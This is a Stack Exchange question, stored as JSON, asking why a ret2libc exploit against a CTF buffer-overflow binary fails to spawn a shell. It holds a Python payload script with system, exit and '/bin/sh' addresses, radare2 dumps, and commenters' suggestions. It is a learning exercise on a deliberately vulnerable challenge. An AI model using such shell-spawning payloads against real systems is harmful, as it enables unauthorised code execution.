{
    "title": "exploiting a binary using ret2libc",
    "link": "https://reverseengineering.stackexchange.com/questions/24644/exploiting-a-binary-using-ret2libc",
    "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>I ran into this binary at a CTF :\n<a href=\"https://github.com/auehc/AUCTF-2020/tree/master/Pwn/House%20of%20Madness\" rel=\"nofollow noreferrer\">https://github.com/auehc/AUCTF-2020/tree/master/Pwn/House%20of%20Madness</a></p>\n<p>I first tried to exploit it and get a shell using ret2libc technique, however I didn't succeed.\nI know it is not the intended way to solve the challenge, but after the CTF, I am now focusing\non achieving ret2libc on this binary. And I am now stuck and need help :)</p>\n<p>The source is in <code>challenge.c</code>, and the compiled version is <code>challenge</code>.</p>\n<p>ASLR is disabled for the challenge, and on my computer too :</p>\n<pre><code>$ &gt; cat /proc/sys/kernel/randomize_va_space\n0\n</code></pre>\n<p>It is possible to trigger a buffer overflow using this input : </p>\n<pre><code>\"2\\n4\\n3\\nStephen\\n\"\n</code></pre>\n<p>plus some padding.</p>\n<p>I wrote an exploit to try to pop a shell (without success) :</p>\n<pre><code>#!/usr/bin/env python2\n\nimport struct\n\nvalid_input = \"2\\n4\\n3\\nStephen\\n\"\npad = \"aaaaaaaa2Aa3Aa4Aa5Aa6Aa7aaaa\"\nbinsh = struct.pack(\"I\", 0xf7f4caaa)\nsystem = struct.pack(\"I\", 0xf7e0c9e0)\nexit = struct.pack(\"&lt;I\", 0xf7dffa60)\n\nexploit = valid_input \\\n        + pad \\\n        + system \\\n        + exit \\\n        + binsh\nprint exploit\n</code></pre>\n<p>Now, I will tell you why I don't understand why it's not working.</p>\n<p>When i break on the <code>ret</code> in the function where I triggered the buffer overflow, the stack looks like this:</p>\n<pre><code>[0x56556684]&gt; pxw 16 @esp\n0xffffd23c  0xf7e0c9e0 0xf7dffa60 0xf7f4caaa 0xffffd200  ....`...........\n</code></pre>\n<p>so, you can see that first there is <code>0xf7e0c9e0</code>, then <code>0xf7dffa60</code>, then <code>0xf7f4caaa</code>.</p>\n<p><code>0xf7e0c9e0</code> is the address of system in the libc :</p>\n<pre><code>[0x56556684]&gt; dmi libc system\n257   0x0012a2c0 0xf7ef82c0 GLOBAL FUNC   102       svcerr_systemerr\n658   0x0003e9e0 0xf7e0c9e0 GLOBAL FUNC   55        __libc_system\n1525  0x0003e9e0 0xf7e0c9e0 WEAK   FUNC   55        system\n</code></pre>\n<p><code>0xf7dffa60</code> is the address of exit, altough it shouldn't be needed, if I popped the shell.</p>\n<p><code>0xf7f4caaa</code> is the address of the string <code>/bin/sh\\x00</code> in the libc :</p>\n<pre><code>[0x56556684]&gt; px10@0xf7f4caaa\n- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF\n0xf7f4caaa  2f62 696e 2f73 6800 6578                 /bin/sh.ex\n</code></pre>\n<p>I am stuck there, and can't figure out what is happening.. If anyone can point me in the right direction, I would be very happy :)</p>\n</div>",
    "votes": "0",
    "answers": 0,
    "views": "342",
    "tags": [
        "radare2",
        "exploit",
        "buffer-overflow",
        "stack",
        "libc"
    ],
    "user": "aguilbau",
    "time": "Apr 7, 2020 at 12:51",
    "comments": [
        {
            "user": "stylo",
            "text": "<span class=\"comment-copy\">Why do you need <code>exit</code> address if you're not using it? when the <code>ret</code> instruction is executed, the <code>system</code> address is been popped out of the stack and the next 4 bytes are considered as the first argument of the function which, in this case, is <code>exit</code> address. try replacing it with the <code>/bin/sh</code> address, it should work.</span>",
            "time": null
        },
        {
            "user": "multithr3at3d",
            "text": "<span class=\"comment-copy\">@stylo Actually, the next 4 bytes are for the <i>next</i> return address after <i>system</i>, so <code>exit</code> will be called after <code>system</code>. What is happening when you try your payload?</span>",
            "time": null
        },
        {
            "user": "multithr3at3d",
            "text": "<span class=\"comment-copy\">Also see <a href=\"https://security.stackexchange.com/q/155844\">security.stackexchange.com/q/155844</a>, could be your problem if addresses are correct.</span>",
            "time": null
        }
    ],
    "answers_data": []
}